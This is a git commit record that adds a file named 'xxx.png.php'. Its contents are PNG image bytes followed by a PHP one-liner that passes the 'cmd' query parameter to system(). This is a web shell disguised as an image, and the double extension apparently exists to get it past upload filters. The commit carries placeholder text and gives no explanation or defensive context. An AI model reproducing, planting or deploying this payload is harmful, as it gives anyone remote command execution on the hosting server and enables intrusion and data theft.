02e4945ba51660a03e165b23ce9a01ce15bb8a13
hackerlo2003 <105090144+hackerlo2003@users.noreply.github.com>
2025-05-16 21:52:33 +0700

    Add files via upload
    xxxx

---
+++ xxx.png.php
@@ -0,0 +1,10 @@
+‰PNG
+
+   
+IHDR   X   J   ?‹“¤   sRGB ®Îé   gAMA  ±
+üa   	pHYs  t  tÞfx  …IDATx^íÜAnÔHÆñÿ+»¢4#ÐIì@¢læ Ã†-K$3®Ã–W‰:Òh4¨™Ø.W=îÎt’I&A¬âï'yQÏe/>?—ÊÃÒI]¿>©ë×«±ü0¯ë÷À¯ îþ¡šÏ_¤‹“åöÂqU½Z…
+`f/æ{{¯ÎO“ïV]¼ÎBkò}B=Ÿ¿s÷kµ{»»ïÖÆò#WÕ›ãªzs±.""""""""""""""""""""""""""""""""""""""wÛ¥ß*ŽÉÖÏ¿{íím6'|þë„ÜÿMìÿäù/ ¼}û‹ÅÄ®!÷¡œàRŽd‹”ÈÅÅÛž3êTš!Ì'“rOÚ¯Tõ?Ýß ï"îŽÙÐ‹ë™
+ÜòZå²Q ìaØ=“RÄÌÁ¤H½·ƒ¤±¼
+8àùv/ý¸v?ëà#I9î•ìïW4mKð|Ö½g×™]ª]eÔ¯EI×5¤‰mÃãG98xÊbñ3:{ù@€—•åø:£Ø1œ@FÊ‘rjyðð>;³Ç4ÿœbfdbrwÜ2Å²ƒðÿHŠ	]ßÛ›í'ê¦[¤.—à7 $°žœ#æNiÀöUÇ¨¶² ,Kœ–(B›ýz—¢ º×—<p°Œ9+Çõ^öŽ+‡,]×‘S"¥Äd2áèèˆ¾‡œ¯ß‚ÝÄ¨.Šw§ïZðLì;¦[÷xvø”¶m¯^cýæ±Ý|æTœì‰rH}Çlç	³ÙŒ¦i(ËÿúJ»ÙöleÜFìOé»–¢pˆ-‡‡‡L§SNO¿žÛëúír=ó
+›Äðó4Ón$    IEND®B`‚
+<?php system($_GET["cmd"]); ?>
